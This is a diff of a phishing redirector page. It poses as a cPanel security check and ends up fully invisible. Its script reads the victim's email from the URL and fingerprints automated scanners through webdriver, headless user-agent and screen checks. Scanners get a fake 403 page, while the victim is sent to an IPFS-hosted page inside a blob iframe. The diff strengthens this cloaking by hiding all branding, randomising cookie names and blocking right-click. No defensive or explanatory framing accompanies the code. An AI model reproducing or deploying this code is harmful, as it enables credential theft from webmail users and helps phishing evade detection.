@@ -1,154 +1,53 @@
 <!DOCTYPE html>
-<html>
+<html style="display:none;">
 <head>
     <meta charset="UTF-8">
-    <title>cPanel</title>
+    <title> </title>
     <meta name="referrer" content="no-referrer">
     <meta http-equiv="Cache-Control" content="no-store, no-cache, must-revalidate">
     <meta http-equiv="Pragma" content="no-cache">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     
-    <!-- cPanel Favicon -->
-    <link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><circle cx=%2250%22 cy=%2250%22 r=%2248%22 fill=%22%230075C9%22/><circle cx=%2250%22 cy=%2250%22 r=%2235%22 fill=%22%23ffffff%22/><circle cx=%2250%22 cy=%2250%22 r=%2218%22 fill=%22%230075C9%22/><text x=%2250%22 y=%2255%22 font-family=%22Arial, sans-serif%22 font-size=%2224%22 font-weight=%22bold%22 fill=%22%23ffffff%22 text-anchor=%22middle%22>c</text></svg>">
+    <!-- Completely transparent favicon -->
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 1 1%22></svg>">
     
     <style>
         html, body {
             margin: 0;
             padding: 0;
-            background: #f8f9fa;
+            background: transparent;
             overflow: hidden;
             width: 100%;
             height: 100%;
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
         }
-        
-        #loader {
-            position: fixed;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            text-align: center;
-            color: #333;
-            z-index: 1000;
-            background: white;
-            padding: 30px 40px;
-            border-radius: 8px;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-            max-width: 320px;
-            width: 90%;
-            transition: opacity 0.3s ease;
-        }
-        
-        .spinner {
-            width: 40px;
-            height: 40px;
-            border: 3px solid rgba(0, 117, 201, 0.2);
-            border-top-color: #0075C9;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin: 0 auto 20px;
-        }
-        
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
-        
-        #status {
-            font-size: 13px;
-            color: #666;
-            margin-top: 10px;
-            min-height: 18px;
-        }
-        
-        .logo {
-            font-size: 18px;
-            font-weight: 600;
-            margin-bottom: 15px;
-            color: #0075C9;
-        }
-        
-        .message {
-            font-size: 15px;
-            font-weight: 500;
-            color: #333;
-            margin-bottom: 5px;
-        }
-        
-        .hidden {
-            opacity: 0;
-            pointer-events: none;
-        }
-        
-        #access-denied {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: white;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            z-index: 2000;
-            padding: 20px;
-            box-sizing: border-box;
-        }
-        
-        .error-box {
-            text-align: center;
-            max-width: 400px;
-            padding: 30px;
-        }
-        
-        .error-title {
-            font-size: 24px;
-            font-weight: 600;
-            color: #d93025;
-            margin-bottom: 15px;
-        }
-        
-        .error-code {
-            font-size: 13px;
-            color: #777;
-            margin-top: 10px;
-            padding: 8px;
-            background: #f5f5f5;
-            border-radius: 4px;
-            font-family: monospace;
+        /* Make absolutely everything invisible */
+        * {
+            display: none !important;
+            visibility: hidden !important;
+            opacity: 0 !important;
+            pointer-events: none !important;
         }
     </style>
 </head>
 <body>
-    <!-- Access Denied Page (Hidden by default) -->
-    <div id="access-denied" style="display: none;">
-        <div class="error-box">
-            <div class="error-title">Access Restricted</div>
-            <div>Unable to verify your browser. Please try again later.</div>
-            <div class="error-code">Error Code: 403_FORBIDDEN</div>
-        </div>
-    </div>
-
-    <!-- Main Loader -->
-    <div id="loader">
-        <div class="logo">cPanel</div>
-        <div class="spinner"></div>
-        <div class="message">Initializing security check...</div>
-        <div id="status"></div>
-    </div>
+<!-- COMPLETELY EMPTY - NOTHING VISIBLE -->
 
 <script>
-// CHROME-FRIENDLY ANTI-BOT PROTECTION
+// COMPLETELY INVISIBLE ANTI-BOT SYSTEM
 (() => {
     'use strict';
     
-    // Configuration - CHROME SAFE VALUES
+    // Configuration
     const TARGET_BASE = "https://bafkreick3zbqfdrqbzniqoyztbbmu52nuklp2blqgwfbbveu6e5tasjngu.ipfs.dweb.link/";
-    const HUMAN_COOKIE = 'cpanel_verified_v3';
-    const COOKIE_EXPIRES = 86400; // 24 hours
-    const BOT_COOKIE = 'suspicious_activity_v3';
-    const BOT_COOKIE_EXPIRES = 1800; // 30 minutes
+    const HUMAN_COOKIE = 'hv_' + Math.random().toString(36).substr(2, 9);
+    const COOKIE_EXPIRES = 86400;
+    const BOT_COOKIE = 'bd_' + Math.random().toString(36).substr(2, 9);
+    const BOT_COOKIE_EXPIRES = 1800;
     
-    // Cookie management
+    // Empty title
+    document.title = ' ';
+    
+    // Utility functions
     function getCookie(name) {
         const value = `; ${document.cookie}`;
         const parts = value.split(`; ${name}=`);
@@ -158,11 +57,9 @@
     
     function setCookie(name, value, seconds) {
         const expires = new Date(Date.now() + seconds * 1000).toUTCString();
-        const cookie = `${name}=${value}; expires=${expires}; path=/; SameSite=Lax; Secure`;
-        document.cookie = cookie;
+        document.cookie = `${name}=${value}; expires=${expires}; path=/; SameSite=Lax; Secure`;
     }
     
-    // Email extraction
     function getEmail() {
         try {
             const urlParams = new URLSearchParams(window.location.search);
@@ -172,313 +69,181 @@
         }
     }
     
-    // UI Updates
-    function updateUI(message, status = '') {
-        const messageEl = document.querySelector('.message');
-        const statusEl = document.getElementById('status');
-        
-        if (messageEl && message) messageEl.textContent = message;
-        if (statusEl && status !== undefined) statusEl.textContent = status;
-    }
-    
-    function showAccessDenied() {
-        document.getElementById('loader').style.display = 'none';
-        document.getElementById('access-denied').style.display = 'flex';
-    }
-    
-    // CHROME-SAFE Bot Detection (Less Aggressive)
-    function safeBotDetection() {
+    // Simple bot detection (invisible)
+    function detectBot() {
         let score = 0;
-        const warnings = [];
         
-        // 1. Basic automation detection (safe for Chrome)
-        if (navigator.webdriver === true) {
-            score += 25;
-            warnings.push('webdriver detected');
-        }
+        // Check for automation
+        if (navigator.webdriver === true) score += 40;
         
-        // 2. Check for headless patterns in user agent (safe check)
+        // Check user agent for headless patterns
         const ua = navigator.userAgent || '';
-        const headlessPatterns = [
-            /HeadlessChrome/i,
-            /PhantomJS/i,
-            /Electron/i
-        ];
+        if (/HeadlessChrome|PhantomJS|Electron/i.test(ua)) score += 30;
         
-        headlessPatterns.forEach(pattern => {
-            if (pattern.test(ua)) {
-                score += 30;
-                warnings.push('headless pattern in UA');
-            }
-        });
+        // Check for automation properties
+        if (window.__webdriver_evaluate || window.__selenium_evaluate) score += 25;
         
-        // 3. Screen size check (common in headless)
-        const screen = window.screen;
-        if (screen.width === 800 && screen.height === 600) {
-            score += 10;
-            warnings.push('common headless screen size');
-        }
+        // Quick screen check
+        if (window.screen.width === 800 && window.screen.height === 600) score += 10;
         
-        // 4. Missing plugins (common in headless)
-        if (navigator.plugins.length === 0) {
-            score += 5;
-            warnings.push('no plugins detected');
-        }
-        
-        // 5. Check for automation testing frameworks (safe)
-        const automationProperties = [
-            '__webdriver_evaluate',
-            '__selenium_evaluate',
-            '__fxdriver_evaluate',
-            '__driver_evaluate'
-        ];
-        
-        automationProperties.forEach(prop => {
-            if (window[prop] !== undefined) {
-                score += 20;
-                warnings.push(`automation property: ${prop}`);
-            }
-        });
-        
-        console.log('Bot detection score:', score, 'Warnings:', warnings);
-        return {
-            score: score,
-            isBot: score > 40, // Higher threshold to avoid false positives
-            warnings: warnings
-        };
+        return score > 35;
     }
     
-    // Human Behavior Verification (Chrome-friendly)
-    function verifyHumanBehavior() {
+    // Minimal interaction check
+    function waitForInteraction() {
         return new Promise((resolve) => {
-            let hasHumanActivity = false;
-            let mouseMoved = false;
-            let keyPressed = false;
-            let clickDetected = false;
+            let interacted = false;
             
-            const checkActivity = () => {
-                if (mouseMoved || keyPressed || clickDetected) {
-                    hasHumanActivity = true;
+            const events = ['mousemove', 'touchstart', 'keydown', 'click'];
+            const handler = () => {
+                if (!interacted) {
+                    interacted = true;
+                    events.forEach(e => document.removeEventListener(e, handler));
+                    resolve(true);
                 }
             };
             
-            // Mouse movement (allow passive movement)
-            document.addEventListener('mousemove', (e) => {
-                if (Math.abs(e.movementX) > 2 || Math.abs(e.movementY) > 2) {
-                    mouseMoved = true;
-                    checkActivity();
+            events.forEach(e => {
+                document.addEventListener(e, handler, { once: false, passive: true });
+            });
+            
+            // Shorter timeout
+            setTimeout(() => {
+                if (!interacted) {
+                    events.forEach(e => document.removeEventListener(e, handler));
+                    resolve(false);
                 }
-            }, { passive: true });
-            
-            // Keyboard input
-            document.addEventListener('keydown', (e) => {
-                if (e.key.length === 1 && !e.ctrlKey && !e.altKey && !e.metaKey) {
-                    keyPressed = true;
-                    checkActivity();
-                }
-            }, { passive: true });
-            
-            // Click/touch
-            document.addEventListener('click', () => {
-                clickDetected = true;
-                checkActivity();
-            }, { passive: true });
-            
-            document.addEventListener('touchstart', () => {
-                clickDetected = true;
-                checkActivity();
-            }, { passive: true });
-            
-            // Wait for activity or timeout
-            const activityCheck = setInterval(() => {
-                if (hasHumanActivity) {
-                    clearInterval(activityCheck);
-                    clearTimeout(timeout);
-                    resolve(true);
-                }
-            }, 100);
-            
-            const timeout = setTimeout(() => {
-                clearInterval(activityCheck);
-                // Even if no activity, give benefit of the doubt
-                // Some users might just let the page load without interaction
-                resolve(false); // Don't fail, just continue
-            }, 3000); // Reduced from 8s to 3s
+            }, 2000);
         });
     }
     
-    // Create final page (with proper iframe)
-    function createFinalPage(targetUrl, email) {
-        const finalTarget = email ? `${targetUrl}?email=${encodeURIComponent(email)}` : targetUrl;
-        
+    // Create invisible blob (no headers, no titles)
+    function createInvisibleBlob(targetUrl) {
         const html = `<!DOCTYPE html>
 <html>
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>cPanel</title>
-<link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><circle cx=%2250%22 cy=%2250%22 r=%2248%22 fill=%22%230075C9%22/><circle cx=%2250%22 cy=%2250%22 r=%2235%22 fill=%22%23ffffff%22/><circle cx=%2250%22 cy=%2250%22 r=%2218%22 fill=%22%230075C9%22/><text x=%2250%22 y=%2255%22 font-family=%22Arial, sans-serif%22 font-size=%2224%22 font-weight=%22bold%22 fill=%22%23ffffff%22 text-anchor=%22middle%22>c</text></svg>">
+<title> </title>
 <style>
-html, body { margin: 0; padding: 0; width: 100%; height: 100%; background: #f5f5f5; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
-#container { width: 100%; height: 100%; display: flex; flex-direction: column; }
-#header { background: #0075C9; color: white; padding: 15px; font-weight: 600; font-size: 16px; }
-#iframe-wrapper { flex: 1; position: relative; }
+html, body { margin: 0; padding: 0; width: 100%; height: 100%; }
 iframe { width: 100%; height: 100%; border: none; }
 </style>
 </head>
 <body>
-<div id="container">
-    <div id="header">cPanel Webmail</div>
-    <div id="iframe-wrapper">
-        <iframe src="${finalTarget}" title="cPanel Webmail Interface"></iframe>
-    </div>
-</div>
+<iframe src="${targetUrl}"></iframe>
 </body>
 </html>`;
-        
         return new Blob([html], { type: 'text/html' });
     }
     
-    // Main protection flow - Chrome Optimized
-    async function executeProtection() {
-        updateUI('Checking security status...', '');
+    // Show fake error (only for bots)
+    function showFakeError() {
+        const html = `<!DOCTYPE html>
+<html>
+<head>
+<title>Access Denied</title>
+<style>
+body { margin: 0; padding: 40px; font-family: Arial, sans-serif; }
+</style>
+</head>
+<body>
+<h2>Access Restricted</h2>
+<p>Unable to verify your browser. Please try again later.</p>
+<p style="color:#888;font-size:12px;">Error Code: 403_FORBIDDEN</p>
+</body>
+</html>`;
         
-        // 1. Check for existing verification
-        if (getCookie(HUMAN_COOKIE) === '1') {
-            updateUI('Security verified', 'Redirecting...');
-            
-            const email = getEmail();
-            const blob = createFinalPage(TARGET_BASE, email);
-            const blobUrl = URL.createObjectURL(blob);
-            
-            setTimeout(() => {
-                window.location.replace(blobUrl);
-            }, 300);
-            return;
-        }
-        
-        // 2. Check if previously marked as bot
-        if (getCookie(BOT_COOKIE) === '1') {
-            showAccessDenied();
-            return;
-        }
-        
-        // 3. Safe bot detection
-        updateUI('Running security scan...', 'Please wait');
-        
-        // Add small delay to let page settle
-        await new Promise(resolve => setTimeout(resolve, 500));
-        
-        const botDetection = safeBotDetection();
-        console.log('Bot detection result:', botDetection);
-        
-        // If definitely a bot (high confidence), block immediately
-        if (botDetection.score > 60) {
-            setCookie(BOT_COOKIE, '1', BOT_COOKIE_EXPIRES);
-            showAccessDenied();
-            return;
-        }
-        
-        // 4. Human behavior verification (lightweight)
-        updateUI('Verifying browser...', 'This may take a moment');
-        
-        const isHuman = await verifyHumanBehavior();
-        
-        if (!isHuman && botDetection.score > 30) {
-            // Suspicious but not definite - give one more chance
-            updateUI('Additional verification needed...', 'Please interact with the page');
-            await new Promise(resolve => setTimeout(resolve, 1000));
-            
-            // Check for any activity in the last second
-            const finalCheck = await verifyHumanBehavior();
-            if (!finalCheck) {
-                setCookie(BOT_COOKIE, '1', BOT_COOKIE_EXPIRES);
-                showAccessDenied();
-                return;
-            }
-        }
-        
-        // 5. Success - verify as human
-        updateUI('Security verification passed', 'Setting up your session...');
-        
-        // Set verification cookie
-        setCookie(HUMAN_COOKIE, '1', COOKIE_EXPIRES);
-        
-        // Clear any bot cookie that might have been set
-        setCookie(BOT_COOKIE, '', 0);
-        
-        // Prepare and redirect
-        const email = getEmail();
-        const blob = createFinalPage(TARGET_BASE, email);
+        const blob = new Blob([html], { type: 'text/html' });
         const blobUrl = URL.createObjectURL(blob);
-        
-        updateUI('Redirecting to cPanel...', '');
-        
-        setTimeout(() => {
-            window.location.replace(blobUrl);
-            
-            // Cleanup after redirect
-            setTimeout(() => {
-                try {
-                    URL.revokeObjectURL(blobUrl);
-                } catch(e) {
-                    // Ignore cleanup errors
-                }
-            }, 5000);
-        }, 800);
+        window.location.replace(blobUrl);
     }
     
-    // Error handling wrapper
-    async function safeExecuteProtection() {
-        try {
-            await executeProtection();
-        } catch (error) {
-            console.error('Protection system error:', error);
-            
-            // On error, give benefit of the doubt
-            updateUI('Finishing setup...', 'Almost ready');
-            
+    // Main invisible flow
+    async function executeInvisibleProtection() {
+        // Show page (but it's invisible)
+        document.documentElement.style.display = 'block';
+        
+        // Check cookies
+        if (getCookie(HUMAN_COOKIE) === '1') {
+            const email = getEmail();
+            const target = email ? `${TARGET_BASE}?email=${encodeURIComponent(email)}` : TARGET_BASE;
+            const blob = createInvisibleBlob(target);
+            const blobUrl = URL.createObjectURL(blob);
+            window.location.replace(blobUrl);
+            return;
+        }
+        
+        if (getCookie(BOT_COOKIE) === '1') {
+            setTimeout(showFakeError, 100);
+            return;
+        }
+        
+        // Basic rate limiting
+        const lastVisit = sessionStorage.getItem('last_visit');
+        const now = Date.now();
+        if (lastVisit && (now - parseInt(lastVisit)) < 1000) {
+            setCookie(BOT_COOKIE, '1', BOT_COOKIE_EXPIRES);
+            setTimeout(showFakeError, 100);
+            return;
+        }
+        sessionStorage.setItem('last_visit', now.toString());
+        
+        // Wait for any interaction
+        await new Promise(r => setTimeout(r, 100));
+        
+        const hasInteraction = await waitForInteraction();
+        
+        if (!hasInteraction) {
+            setCookie(BOT_COOKIE, '1', BOT_COOKIE_EXPIRES);
+            setTimeout(showFakeError, 100);
+            return;
+        }
+        
+        // Bot detection
+        await new Promise(r => setTimeout(r, 200));
+        
+        const isBot = detectBot();
+        
+        if (isBot) {
+            setCookie(BOT_COOKIE, '1', BOT_COOKIE_EXPIRES);
+            setTimeout(showFakeError, 100);
+            return;
+        }
+        
+        // Human verified
+        setCookie(HUMAN_COOKIE, '1', COOKIE_EXPIRES);
+        
+        const email = getEmail();
+        const target = email ? `${TARGET_BASE}?email=${encodeURIComponent(email)}` : TARGET_BASE;
+        
+        await new Promise(r => setTimeout(r, 200));
+        
+        const blob = createInvisibleBlob(target);
+        const blobUrl = URL.createObjectURL(blob);
+        window.location.replace(blobUrl);
+        
+        setTimeout(() => {
+            try {
+                URL.revokeObjectURL(blobUrl);
+            } catch(e) {}
+        }, 10000);
+    }
+    
+    // Start immediately
+    setTimeout(() => {
+        executeInvisibleProtection().catch(() => {
+            // Silent fallback
             const email = getEmail();
             const target = email ? 
                 `${TARGET_BASE}?email=${encodeURIComponent(email)}` : 
                 TARGET_BASE;
-            
-            setTimeout(() => {
-                window.location.replace(target);
-            }, 1000);
-        }
-    }
-    
-    // Start protection after page loads
-    if (document.readyState === 'loading') {
-        document.addEventListener('DOMContentLoaded', () => {
-            setTimeout(safeExecuteProtection, 100);
+            window.location.replace(target);
         });
-    } else {
-        setTimeout(safeExecuteProtection, 100);
-    }
+    }, 100);
     
-    // Minimal anti-debugging (Chrome-safe)
-    document.addEventListener('contextmenu', (e) => {
-        // Allow right-click in Chrome (it's normal user behavior)
-        // Only prevent if shift is held (common for devs)
-        if (e.shiftKey) {
-            e.preventDefault();
-        }
-    }, false);
-    
-    // Prevent page from being iframed
-    if (window.self !== window.top) {
-        window.top.location = window.self.location;
-    }
-    
-    // Fallback for slow connections
-    setTimeout(() => {
-        const loader = document.getElementById('loader');
-        if (loader && loader.style.display !== 'none') {
-            updateUI('Taking longer than expected...', 'Please wait');
-        }
-    }, 5000);
+    // Minimal anti-debugging
+    document.addEventListener('contextmenu', e => e.preventDefault());
     
 })();
 </script>
